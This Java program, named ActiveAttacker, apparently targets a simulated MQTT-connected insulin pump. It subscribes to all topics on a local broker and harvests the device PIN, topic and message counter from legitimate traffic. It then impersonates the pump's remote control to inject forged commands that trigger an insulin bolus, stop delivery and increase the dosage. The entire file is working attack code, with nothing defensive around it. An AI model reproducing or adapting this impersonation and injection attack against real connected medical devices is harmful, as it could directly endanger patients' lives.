import org.eclipse.paho.client.mqttv3.*;
import java.util.UUID;
import MQTT.Message;
import MQTT.CRC12;

public class ActiveAttacker {

    private static final String BROKER = "tcp://localhost:1883";
    private static final String ATTACKER_ID = "ActiveAttacker";

    // These are learned from passive eavesdropping
    private static String learnedTopic = null;
    private static UUID learnedPin = null;
    private static int learnedCounter = 0;

    public static void main(String[] args) throws MqttException, InterruptedException {

        MqttClient client = new MqttClient(BROKER, ATTACKER_ID);
        MqttConnectOptions options = new MqttConnectOptions();
        options.setCleanSession(true);
        client.connect(options);

        System.out.println("[ATTACKER] Connected to broker. Listening for messages...");

        // Step 1: Passive phase — eavesdrop to learn PIN, topic, and counter
        client.subscribe("#", (topic, mqttMessage) -> {
            String raw = new String(mqttMessage.getPayload());
            System.out.println("[ATTACKER] Intercepted on topic '" + topic + "': " + raw);

            try {
                Message msg = Message.deserialize(raw);

                // Validate CRC — only trust well-formed messages
                if (!msg.isValid()) {
                    System.out.println("[ATTACKER] Invalid CRC, ignoring.");
                    return;
                }

                // Learn the PIN and counter from legitimate traffic
                learnedPin = msg.devicePin;
                learnedCounter = msg.counter + 1;
                learnedTopic = topic;

                System.out.println("[ATTACKER] Learned PIN: " + learnedPin);
                System.out.println("[ATTACKER] Learned topic: " + learnedTopic);

            } catch (Exception e) {
                System.out.println("[ATTACKER] Could not parse message: " + e.getMessage());
            }
        });

        // Wait to collect legitimate traffic
        Thread.sleep(5000);

        // Step 2: Active phase — inject malicious command using learned PIN
        if (learnedPin == null || learnedTopic == null) {
            System.out.println("[ATTACKER] No legitimate traffic intercepted yet. Exiting.");
            client.disconnect();
            return;
        }

        System.out.println("[ATTACKER] Launching active attack...");
        launchAttack(client, "BOLUS");   // immediate bolus injection
        Thread.sleep(1000);
        launchAttack(client, "STOP");    // stop insulin delivery
        Thread.sleep(1000);
        launchAttack(client, "INCREASE"); // increase dosage

        client.disconnect();
        System.out.println("[ATTACKER] Attack complete. Disconnected.");
    }

    private static void launchAttack(MqttClient client, String command) throws MqttException {
        // Craft a malicious message using the learned PIN — pump cannot distinguish this
        // from a legitimate remote control message
        Message malicious = new Message(
            "remote",       // impersonate the remote control
            learnedPin,     // use the eavesdropped PIN
            "command",
            command,
            learnedCounter++
        );

        String serialized = malicious.serialize();
        MqttMessage mqttMessage = new MqttMessage(serialized.getBytes());
        mqttMessage.setQos(1);

        client.publish(learnedTopic, mqttMessage);
        System.out.println("[ATTACKER] Sent malicious command '" + command + "' to topic: " + learnedTopic);
    }
}